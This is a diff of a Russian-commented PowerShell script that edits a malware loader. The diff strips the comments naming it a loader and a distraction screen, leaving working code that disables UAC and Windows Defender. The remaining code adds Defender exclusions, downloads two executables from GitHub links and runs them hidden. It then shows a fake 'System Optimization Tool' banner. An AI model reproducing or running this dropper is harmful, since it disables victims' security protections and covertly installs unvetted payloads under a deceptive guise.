@@ -1,5 +1,3 @@
-# MALWARE_LOADER.ps1
-# ПОЛНЫЙ ЛОАДЕР С ОТКЛЮЧЕНИЕМ ЗАЩИТЫ И ЗАГРУЗКОЙ ТВОИХ EXE
 
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Write-Host "[*] Запрос прав администратора..." -ForegroundColor Red
@@ -10,12 +8,12 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 Write-Host "[*] Запуск с правами администратора" -ForegroundColor Green
 
-# ОТКЛЮЧЕНИЕ UAC
+
 $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
 Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
 
-# ОТКЛЮЧЕНИЕ WINDOWS DEFENDER
+
 Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
@@ -27,11 +25,6 @@ Add-MpPreference -ExclusionProcess "Fx.exe" -ErrorAction SilentlyContinue
 
 Write-Host "[*] Windows Defender отключен" -ForegroundColor Green
 
-# НАСТРОЙКА ПРОКСИ (опционально - раскомментировать если нужно)
-# $proxyString = "http://proxy_ip:port"
-# [System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($proxyString)
-
-# ЗАГРУЗКА ТВОИХ EXE ФАЙЛОВ
 $url1 = "https://github.com/enosenso/site/raw/refs/heads/main/Wave.exe"
 $url2 = "https://github.com/kilordow/Fx.exe/releases/download/lol/Fx.exe"
 
@@ -56,7 +49,7 @@ try {
     Write-Host "[-] Ошибка загрузки Fx.exe: $_" -ForegroundColor Red
 }
 
-# ЗАПУСК EXE ФАЙЛОВ
+
 if (Test-Path $path1) {
     Write-Host "[*] Запуск Wave.exe..." -ForegroundColor Cyan
     Start-Process -FilePath $path1 -WindowStyle Hidden
@@ -69,10 +62,9 @@ if (Test-Path $path2) {
     Write-Host "[+] Fx.exe запущен" -ForegroundColor Green
 }
 
-# СКРЫТЫЙ РЕЖИМ - ОЧИСТКА ЛОГОВ
+
 Clear-Host
 
-# ФЕЙКОВЫЙ ИНТЕРФЕЙС (для отвлечения внимания)
 Write-Host ""
 Write-Host "================================================" -ForegroundColor Magenta
 Write-Host "          SYSTEM OPTIMIZATION TOOL v3.1" -ForegroundColor Yellow
